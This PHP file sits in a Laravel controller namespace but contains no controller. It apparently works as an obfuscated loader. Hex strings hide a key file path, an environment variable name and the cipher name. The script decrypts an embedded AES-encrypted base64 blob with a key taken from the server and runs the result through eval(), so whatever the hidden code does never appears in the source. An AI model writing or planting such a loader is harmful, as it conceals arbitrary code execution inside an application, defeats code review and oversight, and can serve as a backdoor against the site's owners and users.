<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('K9Bh7HlZoXN8va9NDwdiXg==');

$c=base64_decode(

'oQ+aoA/3vqV5s9AiVOAJXcaYNLzSfOu0RT5oc0/Yfpq31N6ukbYfcTjIahQo7jt178fpeRWp0Wzw' .
'HPcorNFkt1C112BsZv21+nEL2+OhhHG/WsfFgA4a4PVnCvBmzT56m1V2nLOfKCdUY3s0NiDn4ilf' .
'48IltXkb5UF3Qnh6c92AhdR0DBhjxg2Dk+VbH/9f1HXiV0Kp/TD/vaRuuGe4pw+8zCrcVGyVjiOF' .
'4cMmEsu1XgfErsloGXD+lDCMOiiKxZ1uAgCrFvzFXcBAoq27V0p1ERzdNBw70W1W48zCrxnsqw3l' .
'FUEWvWO0I7ArPBCTyG1G8KABP9M6EcT0RBMtbVtpR7ibpBSEQOgyc9R3T9Bh6ygSZ3qj7EYQBugE' .
'1visa0dKy1BEiFGRkqJfbMqjXA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

